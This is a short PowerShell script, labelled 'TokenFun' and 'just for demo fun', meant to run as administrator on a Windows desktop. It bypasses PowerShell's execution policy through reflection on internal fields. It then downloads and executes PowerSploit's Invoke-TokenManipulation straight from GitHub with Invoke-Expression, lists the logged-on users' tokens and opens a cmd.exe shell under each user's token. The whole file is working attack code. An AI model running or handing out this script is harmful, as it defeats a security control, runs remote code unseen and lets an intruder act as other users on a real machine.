#TokenFun - just for demo fun :)
#desc:intented for desktop use;must be run as admin;disables ps exec policy;opens cmd running as each user on box 
#ref:disables execution policy:http://www.nivot.org/blog/post/2012/02/10/Bypassing-Restricted-Execution-Policy-in-Code-or-in-Script
#ref:dumps auth tokens:https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1
function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy;Invoke-Expression (new-object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1');Invoke-TokenManipulation -showall -ErrorAction SilentlyContinue | select username,processid | Sort-Object username -Unique |foreach { $testuser=$_.username;$testpid=$_.processid;write-host "Creating cmd for $testuser";Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ProcessId $testpid -ErrorAction SilentlyContinue} 
